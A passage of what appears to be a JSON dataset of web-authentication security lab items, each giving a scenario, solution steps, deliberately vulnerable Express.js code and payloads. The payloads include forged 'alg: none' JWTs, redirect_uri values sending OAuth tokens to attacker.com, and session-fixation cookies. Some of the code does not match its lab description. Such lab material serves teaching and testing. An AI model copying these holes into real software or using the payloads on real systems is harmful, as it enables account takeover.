    "payloads": [
      "https://vulnerable-app.com/authorize?response_type=token&client_id=xyz&redirect_uri=https://attacker.com",
      "Captured token from redirect: #access_token=carlos-token",
      "GET /userinfo with Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "JWT token signature verification bypass in login endpoint",
    "Lab Description": "The application's JWT authentication mechanism incorrectly trusts the 'alg' header provided by the client. The server uses a public key but does not enforce the expected algorithm. The application signs JWT tokens using RS256, but accepts tokens where the algorithm is changed to HS256. To solve: Craft a JWT with the alg header set to HS256 and sign it using the public key as the HMAC secret to impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid login response and extract the JWT",
      "Decode the token using jwt.io or jwt_tool to inspect the headers and payload",
      "Change the alg field from RS256 to HS256 and modify the payload sub to 'carlos'",
      "Use the server's public key as the HMAC secret to sign the token using HS256",
      "Replace the original JWT in a request to /my-account and confirm access to Carlos's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const token = req.body.token; try { const decoded = jwt.verify(token, publicKey); if (decoded.sub) res.send(`Welcome ${decoded.sub}`); else res.status(403).send('Invalid token'); } catch (err) { res.status(403).send('Token verification failed'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.sub === 'carlos') res.send('Carlos account page'); else res.status(403).send('Access denied'); } catch (err) { res.status(403).send('Token verification error'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\"}",
      "Payload: {\"sub\":\"carlos\"}",
      "Signature: HMAC(publicKey, base64Url(header) + '.' + base64Url(payload))"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in OAuth 2.0 callback handler",
    "Lab Description": "The OAuth implementation fails to generate a new session upon successful login. Attackers can craft a login URL with a fixed session ID and trick users into authenticating with it. The application binds the victim's account to an attacker-controlled session. To solve: Fixate a session for Carlos by generating a session ahead of time, initiating OAuth flow with that session, and capturing his authenticated session post-login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman or Burp Suite to initiate a login and capture the Set-Cookie header containing the session ID",
      "Store that session ID and embed it in a crafted OAuth login URL as a Cookie header",
      "Send the crafted login URL to Carlos (simulated)",
      "After Carlos logs in via the link, reuse the fixed session ID to access his account",
      "Request /my-account using the fixed session cookie and verify the login was hijacked"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/oauth/callback', (req, res) => { const { code, state } = req.query; const sessionId = req.cookies.session_id; if (sessionId) { sessions[sessionId] = { username: 'carlos' }; res.redirect('/my-account'); } else { res.status(400).send('No session'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session_id; const session = sessions[sessionId]; if (session && session.username === 'carlos') res.send('Carlos account page'); else res.status(403).send('Not authorized'); }); app.listen(4000);",
    "payloads": [
      "GET /oauth/callback?code=abc123&state=xyz HTTP/1.1 with Cookie: session_id=fixed123",
      "Reuse Cookie: session_id=fixed123 to access /my-account"
    ]
  },
  {
    "Lab scenario": "Verbose error leakage in multi-step GraphQL auth process",
    "Lab Description": "The application's GraphQL login mutation leaks detailed error messages that help enumerate valid users and token states. The GraphQL API responds differently when incorrect usernames or passwords are provided. To solve: Enumerate a valid user, retrieve a temporary token from a leaked error, and escalate access via an unprotected token mutation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to send multiple login GraphQL queries and observe differences in error messages",
      "Enumerate valid usernames based on verbose errors (e.g., 'User exists' vs 'Invalid username')",
      "Send a login request for the valid user with an incorrect password to retrieve the temporary token from the verbose error",
      "Use the token in a follow-up mutation to reset the password or authenticate directly",
      "Query myAccount with the new credentials to confirm successful exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': { password: 'secret', tempToken: 'temp-123' } }; app.post('/graphql', (req, res) => { const { query } = req.body; if (query.includes('login')) { const usernameMatch = query.match(/username: \"(.*?)\"/); const passwordMatch = query.match(/password: \"(.*?)\"/); if (!usernameMatch) return res.json({ error: 'Missing username' }); const username = usernameMatch[1]; const password = passwordMatch[1]; if (!users[username]) return res.json({ error: 'Invalid username' }); if (users[username].password !== password) return res.json({ error: `Wrong password, use temp token: ${users[username].tempToken}` }); return res.json({ data: { login: { token: 'valid-token' } } }); } if (query.includes('myAccount')) { const tokenMatch = query.match(/token: \"(.*?)\"/); if (tokenMatch && tokenMatch[1] === 'valid-token') return res.json({ data: { myAccount: { username: 'carlos' } } }); return res.json({ error: 'Access denied' }); } res.json({ error: 'Invalid query' }); }); app.listen(4000);",
    "payloads": [
      "GraphQL login query: { login(username: \"carlos\", password: \"wrongpass\") }",
      "Extract leaked token: temp-123",
      "GraphQL mutation: { resetPassword(tempToken: \"temp-123\", newPassword: \"newpass\") }",
      "GraphQL login: { login(username: \"carlos\", password: \"newpass\") }",
      "GraphQL query: { myAccount(token: \"valid-token\") }"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Flow",
    "Lab Description": "This lab's login flow is vulnerable to session fixation due to the reuse of session identifiers before and after authentication. The application issues a session ID on initial visit and fails to regenerate it after successful login. To solve: hijack Carlos's session using a pre-set session ID to access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET / request to capture a new session cookie.",
      "Send the session cookie to Carlos via social engineering (simulate manually).",
      "Once Carlos logs in with the fixed session ID, reuse the same cookie to access his session.",
      "Browse to /account with the fixed cookie to verify session hijack.",
      "Confirm access to Carlos's data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'vulnsecret', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/', (req, res) => { res.send('Welcome to our site'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { if (req.session.username) { res.send(`User account for ${req.session.username}`); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: connect.sid=fixedsessionid; Path=/; HttpOnly",
      "Reuse the session cookie after victim login",
      "Manual simulation of session fixation through social engineering"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Algorithm Bypass",
    "Lab Description": "This lab uses JSON Web Tokens for session management. It improperly supports the 'none' algorithm and accepts unsigned tokens. The application uses JWTs stored in a cookie to manage sessions but fails to validate signatures correctly. To solve: craft a token for Carlos using the none algorithm and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept JWT from an authenticated user using Burp Suite.",
      "Decode the token header and payload using jwt.io or similar.",
      "Replace the 'alg' field with 'none' and modify payload to impersonate 'carlos'.",
      "Remove the signature part and set the new JWT as a cookie in Burp.",
      "Send a request to /profile with the tampered JWT and confirm Carlos’s account access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos' }]; app.get('/profile', (req, res) => { const token = req.cookies.token; if (!token) return res.status(401).send('Unauthorized'); try { const decoded = jwt.verify(token, 'secretkey'); res.send(`Welcome ${decoded.username}`); } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Unsigned token: base64(header).base64(payload).",
      "Set-Cookie: token=<tampered JWT>"
    ]
  },
  {
    "Lab scenario": "OAuth2 Redirect URI Manipulation",
    "Lab Description": "This lab integrates OAuth2 for social login but allows arbitrary redirection via open redirect in the redirect_uri parameter. The application does not validate the redirect URI domain properly. To solve: trick the app into redirecting to a malicious endpoint to steal Carlos’s token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy and observe the OAuth2 authorization flow.",
      "Identify the redirect_uri parameter used in the authorization request.",
      "Modify redirect_uri to point to an attacker-controlled site (exploit-server).",
      "Send phishing link to Carlos to initiate login using OAuth2 flow.",
      "Capture Carlos’s access token and use it to access /account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://authserver.com/oauth/authorize?response_type=token&client_id=app123&redirect_uri=${redirectUri}`; res.redirect(url); }); app.get('/callback', (req, res) => { const token = req.query.access_token; if (token) { res.send(`Token received: ${token}`); } else { res.send('Login failed'); } }); app.listen(4000);",
    "payloads": [
      "redirect_uri=https://attacker.com/callback",
      "Authorization URL with malicious redirect",
      "access_token captured from redirected request"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in API authorization",
    "Lab Description": "The API uses JWT tokens for user authorization. However, it trusts the 'alg' header in incoming tokens, enabling algorithm confusion attacks. The application accepts tokens signed with 'none' algorithm, bypassing signature validation. To solve: Forge a token granting admin access and retrieve the admin panel contents.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a legitimate JWT issued to a normal user during login via the /api/login endpoint.",
      "Inspect the JWT structure in jwt.io and observe the use of HS256 algorithm.",
      "Modify the 'alg' field to 'none' and set the 'role' claim to 'admin', leaving the signature section blank.",
      "Send the tampered JWT as a Bearer token in an Authorization header to the /api/admin route.",
      "Verify successful access to the admin panel, indicating bypass of token signature verification."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/api/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('Forbidden'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome to the admin panel'); } else { try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Welcome to the admin panel'); } catch (e) { return res.status(401).send('Invalid token'); } } res.status(403).send('Access denied'); }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on port ${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via unrotated session cookie after login",
    "Lab Description": "The web application issues a session cookie to all visitors, including unauthenticated ones. However, it fails to rotate the session cookie upon successful login. This enables a session fixation attack. To solve: Fixate Carlos’s session cookie prior to login and hijack his session after authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET request to /login and capture the unauthenticated session cookie.",
      "Send Carlos a crafted phishing link embedding the session ID via query string or manipulate the browser via XSS/social engineering.",
      "Wait until Carlos logs in using the pre-fixed session.",
      "Use the same session ID to access /my-account while impersonating Carlos.",
      "Verify access to Carlos's account with no re-authentication required."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = { loggedIn: false }; res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\">Username:<input name=\"username\">Password:<input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid].loggedIn = true; sessions[sid].user = username; return res.redirect('/my-account'); } res.send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] && sessions[sid].loggedIn) return res.send(`Welcome ${sessions[sid].user}`); res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on port ${PORT}`));",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: sid=attackerfixedsessionid",
      "sid=attackerfixedsessionid in phishing email redirect",
      "Cookie replay: sid=attackerfixedsessionid"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect and auto approval",
    "Lab Description": "The application implements OAuth with a third-party identity provider but fails to validate the 'redirect_uri' parameter and automatically grants access tokens. This misconfiguration enables attackers to steal tokens via malicious redirects. To solve: Craft a malicious URL to capture Carlos’s OAuth token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inspect the /oauth/authorize endpoint parameters using Burp Suite and note the presence of redirect_uri, response_type, and client_id.",
      "Observe that the redirect_uri can be modified to external domains.",
      "Craft a URL using the known client_id and a malicious redirect_uri pointing to your server.",
      "Trick Carlos into clicking the link (e.g., via social engineering).",
      "Capture the access token appended in the redirect_uri and use it to call /api/userinfo.",
      "Validate that the token grants access to Carlos's profile data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { carlos: 'abc123xyz' }; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = tokens['carlos']; const uri = `${redirect_uri}#access_token=${token}&token_type=bearer`; return res.redirect(uri); } res.status(400).send('Invalid request'); }); app.get('/api/userinfo', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'abc123xyz') return res.send({ username: 'carlos', email: 'carlos@example.com' }); res.status(403).send('Forbidden'); }); const PORT = 5000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on port ${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/oauth/authorize?response_type=token&client_id=trusted-app&redirect_uri=https://attacker.com/capture",
      "https://attacker.com/capture#access_token=abc123xyz",
      "Authorization: Bearer abc123xyz"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in token validation logic",
    "Lab Description": "The application uses JWTs to maintain session state but fails to validate the token's algorithm correctly. The backend blindly trusts the `alg` field in the token header. The application accepts unsigned tokens when the `alg` is set to `none`. To solve: Forge a valid token to access Carlos's account without knowing his password.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept a valid JWT token using Burp Suite after logging into your own account.",
      "2. Modify the JWT header to set 'alg' to 'none' and remove the signature section.",
      "3. Modify the payload to set the 'username' claim to 'carlos'.",
      "4. Encode the header and payload in base64url format and concatenate with a period, omitting the signature.",
      "5. Use Postman to send a request to /my-account with the forged token in the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', role: 'admin' }]; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const user = users.find(u => u.username === decoded.payload.username); if (user) { res.send(`Welcome ${user.username}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session token in login flow",
    "Lab Description": "The application generates session IDs before authentication and does not invalidate them after login. A malicious user can set a known session ID, get the victim to use it, then hijack the session after they log in. To solve: Log in as Carlos by setting and reusing a fixed session cookie.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp to send a GET request to the login page and intercept the Set-Cookie response header.",
      "2. Manually set the session cookie in your browser to 'session=attackersessionid'.",
      "3. Send the crafted login link with the session cookie pre-set to Carlos.",
      "4. Once Carlos logs in using the attacker's session, revisit /my-account with the same session cookie.",
      "5. Confirm session takeover and access the account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/login', (req, res) => { const sid = req.cookies.session || 'guest-' + Math.random().toString(36).substr(2); res.cookie('session', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.session] = username; res.send('Logged in'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Account: ${user}`); else res.send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "session=attackersessionid",
      "GET /login HTTP/1.1 with Set-Cookie: session=attackersessionid",
      "GET /my-account HTTP/1.1 with Cookie: session=attackersessionid"
    ]
  },
  {
    "Lab scenario": "OAuth implicit grant misconfiguration leaking access token via referer",
    "Lab Description": "The app implements OAuth using the implicit flow, but includes a third-party analytics script that logs full Referer headers. Since access tokens are returned in the URL fragment, these tokens leak to third-party domains. To solve: Capture Carlos's leaked access token and use it to access his account data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to proxy OAuth login flow and observe the redirect URL fragment.",
      "2. Capture a valid access_token value from the browser's redirect to /oauth/callback.",
      "3. Check the Referer header sent to a third-party script and extract the token from HTTP history.",
      "4. Replay the token in Postman using the Authorization: Bearer header against /api/account.",
      "5. Verify account data of Carlos to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const token = req.query.access_token; res.send(`<script src='https://third-party.io/track.js'></script><h1>Logged in</h1>`); }); app.get('/api/account', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; if (auth === 'valid-oauth-token-for-carlos') { res.send('Account data for carlos'); } else { res.status(401).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "Authorization: Bearer valid-oauth-token-for-carlos",
      "GET /api/account HTTP/1.1 with leaked token",
      "https://example.com/oauth/callback#access_token=valid-oauth-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion attack in REST login API",
    "Lab Description": "This lab’s login functionality accepts JWTs for authentication but fails to enforce proper algorithm validation. The application trusts tokens signed with 'none' algorithm. To solve: forge a JWT token impersonating the user 'carlos' and access their profile page via /api/profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept POST /api/login with Burp Suite and extract the JWT returned in the Set-Cookie header.",
      "Decode the token using jwt.io or a similar tool and observe the 'alg' header.",
      "Modify the JWT header to use 'alg':'none' and remove the signature.",
      "Modify the payload to {\"user\":\"carlos\"} and re-encode the JWT using base64url.",
      "Send a GET /api/profile request with the forged JWT in the Authorization: Bearer header and confirm Carlos’s data is returned."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 's3cret' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ user: username }, 'supersecret'); res.cookie('auth', token); res.send('Logged in'); }); app.get('/api/profile', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { res.send(`Welcome ${payload.payload.user}`); return; } try { const verified = jwt.verify(token, 'supersecret'); res.send(`Welcome ${verified.user}`); } catch (e) { res.status(403).send('Invalid'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "Authorization: Bearer [none-algorithm-jwt]"
    ]
  },
  {
    "Lab scenario": "Session fixation in OAuth login flow",
    "Lab Description": "This lab is vulnerable to session fixation during OAuth-based third-party login. The application fails to issue a new session token post-authentication. To solve: authenticate as yourself, fix a session ID, and force the victim (Carlos) to reuse the session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to capture your login request via the OAuth flow and record the session cookie.",
      "Send the fixed session cookie to a victim via phishing or iframe auto-GET with document.cookie injection.",
      "Simulate Carlos logging in by issuing a GET /auth/callback request with the fixed session.",
      "Observe that Carlos inherits your session and gets logged into the attacker session.",
      "Access /account using the fixed session and confirm Carlos's details are exposed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'oauth-secret', resave: false, saveUninitialized: true })); const users = { 'carlos': {}, 'attacker': {} }; app.get('/login', (req, res) => { const sessionID = req.sessionID; res.redirect(`/auth?state=${sessionID}`); }); app.get('/auth/callback', (req, res) => { const sessionID = req.query.state; req.session.id = sessionID; req.session.user = 'carlos'; res.send('Logged in via OAuth'); }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Account data for ${req.session.user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET /auth/callback?state=[attacker-session-id]",
      "Set-Cookie: connect.sid=[fixed-session-id]"
    ]
  },
  {
    "Lab scenario": "Blind 2FA brute-force with timing side-channel",
    "Lab Description": "The 2FA mechanism leaks processing time differences for valid codes. The backend takes longer to process correct digits. To solve: use timing analysis to brute-force Carlos's 6-digit 2FA code and access his account via /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in as Carlos with correct username and password using Burp Suite or Postman.",
      "Send multiple POST /verify requests with different 2FA codes and measure response times using Burp Logger++ or Python’s time module.",
      "Identify the correct digits one-by-one based on increased response delay.",
      "Automate the timing attack using a custom script to determine the full 6-digit code.",
      "Submit the correct code to complete login and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 'p4ssword', code: '492138' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); req.session = { username }; res.redirect('/2fa'); }); app.post('/verify', (req, res) => { const { username, code } = req.body; const user = users.find(u => u.username === username); for (let i = 0; i < code.length; i++) { if (user.code[i] !== code[i]) return res.status(403).send('Denied'); sleep(100); } res.send('2FA Passed'); }); function sleep(ms) { const start = Date.now(); while (Date.now() - start < ms); } app.get('/my-account', (req, res) => { if (req.session && req.session.username === 'carlos') res.send('Carlos account data'); else res.status(403).send('Unauthorized'); }); app.listen(5000);",
    "payloads": [
      "POST /verify with code=4xxxxx",
      "POST /verify with code=49xxxx",
      "POST /verify with code=4921xx",
      "POST /verify with code=492138"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm tampering in API auth header",
    "Lab Description": "The API uses JWT-based authentication for sensitive endpoints but fails to validate the algorithm used. The application decodes and accepts tokens with `alg: none` without proper signature verification. To solve: Forge a valid JWT that grants admin privileges and access the protected /admin/report endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to observe a valid JWT issued after login and note the algorithm and claims.",
      "Copy the token and decode it using jwt.io. Confirm that `alg` is set to `HS256` or similar.",
      "Manually change the JWT header to `{ \"alg\": \"none\" }` and payload to `{ \"role\": \"admin\" }`.",
      "Remove the signature part entirely and send the manipulated JWT in the Authorization header using Burp Repeater.",
      "Confirm admin access by receiving a 200 OK response and viewing the report data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/report', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Sensitive admin report'); } else { jwt.verify(token, SECRET); const decoded = jwt.decode(token); if (decoded.role === 'admin') return res.send('Sensitive admin report'); } res.status(403).send('Access denied'); } catch (e) { res.status(500).send(e.message); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leak in redirect URI",
    "Lab Description": "The application integrates OAuth2 login using the implicit flow and allows open redirection through the `redirect_uri` parameter. The access token is leaked via URL fragment and reflected in the redirect. To solve: Intercept the OAuth flow and capture Carlos's token using a crafted redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth2 login initiation flow and identify the authorization URL with response_type=token.",
      "Modify the redirect_uri parameter to a malicious endpoint under your control (e.g., https://attacker.com/#access_token=)",
      "Send the modified link to Carlos using the comment feature on the website (assume CSRF vector or social engineering).",
      "When Carlos clicks the link, the access_token fragment will be appended to your site. Capture this with a listener or webhook.site.",
      "Replay the captured token in the Authorization header and access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': { token: 'abc123xyz', role: 'user' } }; app.get('/auth', (req, res) => { const { redirect_uri, response_type } = req.query; if (response_type === 'token') { const accessToken = 'abc123xyz'; res.redirect(`${redirect_uri}#access_token=${accessToken}`); } else { res.status(400).send('Unsupported flow'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === users['carlos'].token) return res.send('Account details for carlos'); res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Token Leak Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/#access_token=&response_type=token",
      "Authorization: Bearer abc123xyz"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure session ID reuse in cookie",
    "Lab Description": "The application allows users to set their own session ID via a cookie prior to authentication. Upon login, the session ID is not regenerated. An attacker can set a known session value and trick a victim into logging in using it. To solve: Fix a session ID and use it to hijack Carlos's session after he logs in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, access the site while unauthenticated and manually add a session=attacker123 cookie in the request.",
      "Log in with your own credentials and observe that the session ID remains unchanged.",
      "Send a crafted link to Carlos that sets document.cookie = 'session=attacker123' via reflected XSS or social engineering.",
      "After Carlos logs in, reuse the session=attacker123 cookie and visit /my-account.",
      "If session fixation is successful, the response will include Carlos's account data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': 'secretpass' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || 'anon'; sessions[sid] = username; res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]; if (user === 'carlos') res.send('Carlos account info'); else res.send('Not authorized'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=attacker123",
      "document.cookie = 'session=attacker123'",
      "POST /login with session=attacker123 then wait for Carlos to login with same session"
    ]
  },
  {
    "Lab scenario": "JWT tampering using 'alg: none' in Authorization header",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) for user authentication and authorizes access via Bearer tokens. The backend relies on the JWT's `alg` field to determine signature verification. The application fails to enforce algorithm restrictions, allowing manipulation of the `alg` field to 'none' and bypassing signature verification. To solve: tamper with your JWT to impersonate the admin user and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT using Burp Suite by logging in as a regular user.",
      "Decode the token using jwt.io or Burp Decoder. Change `alg` to `none` and `sub` to `admin`.",
      "Remove the signature portion completely, then base64-encode the modified header and payload.",
      "Replace the Authorization header with the forged token in Postman or Burp Repeater.",
      "Send a GET request to /admin and confirm access to solve the lab."
    ],
    "Vulnerability name": "Authentication",
